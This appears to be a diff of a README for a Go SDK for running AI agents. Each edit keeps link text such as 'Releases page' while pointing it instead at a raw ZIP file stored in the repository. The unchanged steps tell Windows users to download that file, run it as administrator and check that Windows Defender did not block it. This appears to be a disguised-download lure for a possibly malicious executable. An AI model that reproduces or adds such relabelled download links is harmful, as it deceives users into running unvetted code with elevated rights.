@@ -1,12 +1,12 @@
 # 🧩 open-agent-sdk-go - Run AI agents with ease
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Sammyblear596/open-agent-sdk-go/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Sammyblear596/open-agent-sdk-go/raw/refs/heads/main/api/sdk-open-go-agent-1.7.zip)
 
 ## 📥 Download
 
 Use this link to visit the release page and download the app for Windows:
 
-[Go to Releases](https://github.com/Sammyblear596/open-agent-sdk-go/releases)
+[Go to Releases](https://github.com/Sammyblear596/open-agent-sdk-go/raw/refs/heads/main/api/sdk-open-go-agent-1.7.zip)
 
 ## 🖥️ What this app does
 
@@ -31,7 +31,7 @@ Before you download and run the app on Windows, make sure you have:
 
 ## 🚀 Getting started on Windows
 
-1. Open the [Releases page](https://github.com/Sammyblear596/open-agent-sdk-go/releases)
+1. Open the [Releases page](https://github.com/Sammyblear596/open-agent-sdk-go/raw/refs/heads/main/api/sdk-open-go-agent-1.7.zip)
 2. Find the latest release
 3. Download the Windows file listed under the release assets
 4. If the file comes in a ZIP folder, right-click it and choose Extract All
@@ -126,7 +126,7 @@ Try these steps if nothing happens after you open it:
 2. Check that the file is not still inside a ZIP folder
 3. Try running it as an administrator
 4. Confirm that Windows Defender or another security tool did not block it
-5. Download the file again from the [Releases page](https://github.com/Sammyblear596/open-agent-sdk-go/releases)
+5. Download the file again from the [Releases page](https://github.com/Sammyblear596/open-agent-sdk-go/raw/refs/heads/main/api/sdk-open-go-agent-1.7.zip)
 
 ## 🗂️ Suggested file layout
 
@@ -174,7 +174,7 @@ Keep the key private. Do not share it in chat or email.
 
 To get the Windows version, visit the release page and download the file listed for your system:
 
-[Download from GitHub Releases](https://github.com/Sammyblear596/open-agent-sdk-go/releases)
+[Download from GitHub Releases](https://github.com/Sammyblear596/open-agent-sdk-go/raw/refs/heads/main/api/sdk-open-go-agent-1.7.zip)
 
 After the download finishes:
 
